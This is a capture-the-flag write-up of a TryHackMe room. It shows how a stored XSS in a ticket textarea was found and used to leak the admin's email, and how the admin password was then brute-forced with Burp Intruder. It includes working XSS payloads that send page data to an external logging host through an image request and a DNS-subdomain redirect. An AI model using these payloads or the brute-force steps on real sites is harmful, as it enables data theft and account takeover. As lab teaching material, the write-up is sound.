# That's The Ticket

## Introduction:

Welcome to my another writeup! In this TryHackMe [That's The Ticket](https://tryhackme.com/room/thatstheticket) room, you'll learn: Stored XSS, or Cross-Site Scripting! Without further ado, let's dive in.

## Background

> IT Support are going to have a bad day, can you get into the admin account?

> Difficulty: Medium

```
IT Support is going to have a really bad day today, but don't think they're stupid! They have really strict firewalls!

Using the IT support portal try and make your way into the admin account.

Hint: Our HTTP & DNS Logging tool on http://10.10.10.100 may come in useful! 
```

- Overall difficulty for me: Easy

# Task 1 - Lab Informaion

- Question: What is IT Supports email address?

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/That's-The-Ticket]
└─# export RHOSTS=10.10.213.250
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/That's-The-Ticket]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bf:c3:9c:99:2c:c4:e2:d9:20:33:d1:3c:dc:01:48:d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8dfacBZcXm48CzKZh1Vd6tO6p86sR7PyBbxJj9q9Zifzlq+GmD+r1eXLaH+waOWnD/fmPr8CtScSVP0iu0opnIZ21A4Zy/SOjNKVuDWGWP36cj/XxiTlLL3qfOk0OXy/xVEYycYWhiJm1VLhOSg5Tk3xGGJRBY9V1MfBF/Oq2DdEcODzUnh/JLikJctZ15DwGTaY+6ehl6Kh1PwRQ6XZmhLP42P9NtPCY8AkXCO2EJrE/tzckhUzi4vr17Z0M4zZd8AZX1SfX3t5hULhKMDbQ7zRQNTIeaLYdPBa4Yu3Ze2annUvOlKhnTKm+omW7vbXKWurIWRqyG59F12sNHl3P
|   256 08:20:c2:73:c7:c5:d7:a7:ef:02:09:11:fc:85:a8:e2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO1cxZc0WJgiYCd7m7sxzMYbgVLjqIc40ZZi4Y+M+YHJeISCq1bhTMLSpIWHxwpnQg+qVD3wrgYWI9Hr6FGGMrg=
|   256 1f:51:68:2b:5e:99:57:4c:b7:40:15:05:74:d0:0d:9b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFCYrvmQ5DCiI8ZbvzVWWIkj1apQr36j4vJ8K8MfUCKz
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-title: Ticket Manager > Home
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80	              | nginx 1.14.0 (Ubuntu)

## HTTP on Port 80

**In the home page, we can see that we're able to login or register an account:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a1.png)

**`/login`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a2.png)

In the login page, I tried to authentication bypass with SQL injection, but no dice.

**Then I guess we'll have to register an account in `/register`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a3.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a4.png)

After we registered an account, we can create a ticket. I'll create a ticket for testing purposes:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a5.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a6.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a7.png)

I also tried the IDOR, or Insecure Direct Object Reference, but when I reach `/1`, it redirects me to the home page.

Now, **why not test the message box is vulnerable to XSS, or Cross-Site Scripting?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a8.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a9.png)

The `alert(1)` is not working?

After inspecting the message box, I found that **this is a `textarea` in HTML**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a10.png)

**To bypass `textarea`, we can just simply close that tag by adding `</textarea>` before our XSS payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a11.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a12.png)

Yes!!! We trigged the XSS vulnerability, and it's a stored XSS!

**Now, we can create an iframe XSS payload!**

> Note: You can create HTTP & DNS Logging tool in [TryHackMe Request Catcher](http://10.10.10.100).

**payload:**
```html
</textarea><iframe src="http://cab5af170585946566f5fc8d2578fdd1.log.tryhackme.tech/">
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a13.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a14.png)

Confirmed that we have a call back.

**Now we need admin's email in question 1**

After logged in, the top-right hand corner has **a `<span>` tag, which contains the `email` id**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a15.png)

We can leverage the XSS vulnerability to capture admin's email via the follow payload! (From a [GitHub repository](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md) and a [StackOverflow post](https://stackoverflow.com/questions/13341095/how-to-get-the-value-of-id-of-innerhtml).) 

```html
</textarea><script>var i=new Image;i.src="http://cab5af170585946566f5fc8d2578fdd1.log.tryhackme.tech/?"+document.getElementById('email').innerHTML;</script>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a16.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a17.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a18.png)

> Note: Some DNS requests are the admin user. 

Successfully capture our email, let's capture the admin's email!

**Since URL encoding will break special characters like `@` and `.`, we need to escape them:**
```html
</textarea><script>
var i = document.getElementById('email').innerText;
i = i.replace('@', 'at')
i = i.replace('.', 'dot')
document.location = 'http://' + i + '.cab5af170585946566f5fc8d2578fdd1.log.tryhackme.tech/';
</script>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a19.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a20.png)

**In one of those DNS requests, we can see that there is an email for user `admin`!!**

- Question 2: Admin users password

Armed with admin's email, **we can bruteforce his password via Burp Suite Intruder!**

**To do so, I'll:**

- Intercept the POST request in `/login` via Burp Suite:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a21.png)

- Send the intercepted request to `Intruder`: (`Ctrl + i`)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a22.png)

- Clear all positions via `Clear` button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a23.png)

- Highlight the password, and add position to it via `Add` button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a24.png)

- Load a password wordlist payload in `Payloads` tab:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a25.png)

- After loaded the wordlist, click `Start Attack`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a26.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a27.png)

**Found the password!**

- Question 3: Flag inside Ticket 1

**Let's login to the admin user!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a28.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a29.png)

We're in!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/That's-The-Ticket/images/a30.png)

# Conclusion

What we've learned:

1. Stored XSS (Cross-Site Scripting)
2. Password Bruteforcing in HTTP POST Form